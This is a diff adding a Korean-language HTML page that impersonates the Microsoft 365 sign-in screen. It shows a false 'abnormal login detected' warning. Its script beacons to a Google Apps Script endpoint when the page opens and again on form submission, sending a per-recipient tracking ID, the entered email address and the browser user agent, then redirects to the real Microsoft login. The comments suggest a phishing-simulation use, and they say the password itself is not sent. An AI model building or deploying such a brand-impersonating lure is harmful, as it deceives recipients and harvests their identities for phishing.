@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>로그인 - Microsoft 365</title>
+<style>
+  body{margin:0;font-family:'Segoe UI',Tahoma,sans-serif;background:#f2f2f2}
+  .box{max-width:440px;margin:80px auto;background:#fff;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
+  .logo{height:24px;margin-bottom:16px}
+  h1{font-size:24px;font-weight:600;margin:0 0 16px}
+  input{width:100%;box-sizing:border-box;padding:10px 0;border:none;border-bottom:1px solid #666;font-size:15px;margin-bottom:16px;outline:none}
+  .sub{font-size:13px;color:#666;margin-bottom:16px}
+  .btn{background:#0067b8;color:#fff;border:none;padding:10px 24px;font-size:15px;float:right;cursor:pointer}
+  .foot{clear:both;padding-top:40px;font-size:11px;color:#888;text-align:right}
+</style>
+</head>
+<body>
+<div class="box">
+  <img class="logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
+  <h1>로그인</h1>
+  <form id="f">
+    <input type="email" id="email" name="email" placeholder="전자 메일, 전화 또는 Skype" required>
+    <input type="password" id="password" name="password" placeholder="암호" required>
+    <div class="sub">비정상 로그인이 감지되어 본인 확인이 필요합니다.</div>
+    <button class="btn" type="submit">다음</button>
+  </form>
+  <div class="foot">&copy; 2026 Microsoft</div>
+</div>
+
+<script>
+  // ===== 설정: Apps Script 웹앱 URL을 여기에 붙여넣으세요 =====
+  var LOG_URL = "https://script.google.com/macros/s/AKfycbz8TglVF90sIF0OeyOun2OyQdTCHmw4c1hhiHDd4GhMECsPSyPeQyxtjV6QQMJYWB0F/exec";
+  // 제출 후 이동할 진짜 페이지
+  var REDIRECT = "https://login.microsoftonline.com";
+  // ===========================================================
+
+  // 수신자 식별자 (이메일 링크의 ?u= 값)
+  var u = new URLSearchParams(location.search).get("u") || "unknown";
+
+  function log(event, extra){
+    try {
+      var img = new Image();
+      img.src = LOG_URL + "?event=" + encodeURIComponent(event)
+        + "&u=" + encodeURIComponent(u)
+        + "&extra=" + encodeURIComponent(extra || "")
+        + "&ua=" + encodeURIComponent(navigator.userAgent)
+        + "&t=" + Date.now();
+    } catch(e){}
+  }
+
+  // 페이지 열림 = 링크 클릭함
+  log("클릭");
+
+  // 폼 제출 = 자격증명 입력함 (실제 비밀번호는 보내지 않음 — 입력 여부만 기록)
+  document.getElementById("f").addEventListener("submit", function(ev){
+    ev.preventDefault();
+    var enteredEmail = document.getElementById("email").value || "";
+    log("입력제출", enteredEmail);
+    // 잠깐 기다렸다 진짜 로그인으로 리다이렉트
+    setTimeout(function(){ location.href = REDIRECT; }, 600);
+  });
+</script>
+</body>
+</html>
